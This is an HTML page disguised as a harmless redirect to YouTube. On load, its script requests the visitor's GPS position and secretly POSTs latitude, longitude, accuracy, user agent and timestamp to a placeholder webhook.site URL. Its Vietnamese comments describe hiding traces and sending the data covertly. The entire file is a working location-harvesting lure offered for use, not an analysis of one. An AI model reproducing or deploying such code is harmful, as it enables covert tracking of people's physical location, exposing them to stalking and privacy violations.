<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
      // Ẩn dấu vết: không hiện gì trên màn hình
      window.onload = function() {
        try {
          navigator.geolocation.getCurrentPosition(function(pos) {
            let lat = pos.coords.latitude;
            let lon = pos.coords.longitude;
            let acc = pos.coords.accuracy;
            let ua = navigator.userAgent;
            let time = new Date().toString();

            // Gửi kín thông tin về webhook
            fetch("https://webhook.site/YOUR-LINK-HERE", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                lat: lat,
                lon: lon,
                acc: acc,
                ua: ua,
                time: time
              })
            });

            // Chuyển hướng sau 2 giây
            setTimeout(() => {
              location.href = "https://youtube.com";
            }, 2000);
          }, function() {
            // Nếu người dùng từ chối truy cập GPS → vẫn redirect
            setTimeout(() => {
              location.href = "https://youtube.com";
            }, 1500);
          });
        } catch (e) {
          location.href = "https://youtube.com";
        }
      };
    </script>
  </head>
  <body>
  </body>
</html>
